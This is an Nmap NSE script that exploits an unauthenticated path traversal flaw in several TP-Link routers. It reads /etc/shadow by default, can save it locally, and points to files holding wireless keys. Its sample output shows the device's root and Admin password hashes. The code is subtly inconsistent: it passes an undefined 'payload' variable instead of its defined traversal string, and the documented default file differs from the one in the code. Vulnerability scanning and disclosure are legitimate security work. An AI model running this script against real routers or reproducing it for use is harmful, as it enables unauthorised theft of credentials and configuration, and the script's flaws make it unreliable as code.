description = [[
Exploits a directory traversal vulnerability existing in several TP-Link
wireless routers. Attackers may exploit this vulnerability to read any of the
configuration and password files remotely and without authentication.

This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but
there are several models that use the same HTTP server so I believe they could
be vulnerable as well. I appreciate any help confirming the vulnerability in
other models.

Advisory:
* http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740

Other interesting files:
* /tmp/topology.cnf (Wireless configuration)
* /tmp/ath0.ap_bss (Wireless encryption key)
]]

---
-- @usage nmap -p80 --script http-tplink-dir-traversal.nse <target>
-- @usage nmap -p80 -Pn -n --script http-tplink-dir-traversal.nse <target>
-- @usage nmap -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-tplink-dir-traversal:
-- |   VULNERABLE:
-- |   Path traversal vulnerability in several TP-Link wireless routers
-- |     State: VULNERABLE (Exploitable)
-- |     Description:
-- |       Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
-- |       This vulnerability can be exploited remotely and without authentication.
-- |       Confirmed vulnerable models: WR740N, WR740ND, WR2543ND
-- |       Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.
-- |     Disclosure date: 2012-06-18
-- |     Extra information:
-- |       /etc/shadow :
-- |
-- |   root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
-- |   Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
-- |   bin::10933:0:99999:7:::
-- |   daemon::10933:0:99999:7:::
-- |   adm::10933:0:99999:7:::
-- |   lp:*:10933:0:99999:7:::
-- |   sync:*:10933:0:99999:7:::
-- |   shutdown:*:10933:0:99999:7:::
-- |   halt:*:10933:0:99999:7:::
-- |   uucp:*:10933:0:99999:7:::
-- |   operator:*:10933:0:99999:7:::
-- |   nobody::10933:0:99999:7:::
-- |   ap71::10933:0:99999:7:::
-- |
-- |     References:
-- |_      http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
--
-- @args http-tplink-dir-traversal.rfile Remote file to download. Default: /etc/passwd
-- @args http-tplink-dir-traversal.outfile If set it saves the remote file to this location.
--
-- Other arguments you might want to use with this script:
-- * http.useragent - Sets user agent
--

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

local http = require "http"
local io = require "io"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local exploit = require "exploit"

portrule = shortport.http

local TRAVERSAL_QRY = "/help/../.."
local DEFAULT_REMOTE_FILE = "/etc/shadow"

---
-- MAIN - The script checks for vulnerable devices by attempting to read "etc/shadow" and finding the pattern "root:".
---
action = function(host, port)
  local response, rfile, rfile_content, filewrite
  local output_lines = {}

  filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
  rfile = stdnse.get_script_args(SCRIPT_NAME..".rfile") or DEFAULT_REMOTE_FILE

  local vuln = {
       title = 'Path traversal vulnerability in several TP-Link wireless routers',
       state = vulns.STATE.NOT_VULN,
       description = [[
Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
This vulnerability can be exploited without authentication.
Confirmed vulnerable models: WR740N, WR740ND, WR2543ND
Possibly vulnerable (Based on the same firmware): WR743ND,WR842ND,WA-901ND,WR941N,WR941ND,WR1043ND,MR3220,MR3020,WR841N.]],
       references = {
           'http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740'
       },
       dates = {
           disclosure = {year = '2012', month = '06', day = '18'},
       },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local status, lfi_success, contents, _, outfile_status, outfile_err = exploit.lfi_check(host, port, payload, rfile, filewrite)
  if lfi_success then
    vuln.state = vulns.STATE.EXPLOIT
    local  _, _, rfile_content = string.find(contents, 'SCRIPT>(.*)')
    vuln.extra_info = rfile.." :\n"..rfile_content
    if outfile_status then
      vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
    else
      vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, outfile_err)
    end
  end
  return vuln_report:make_output(vuln)
end
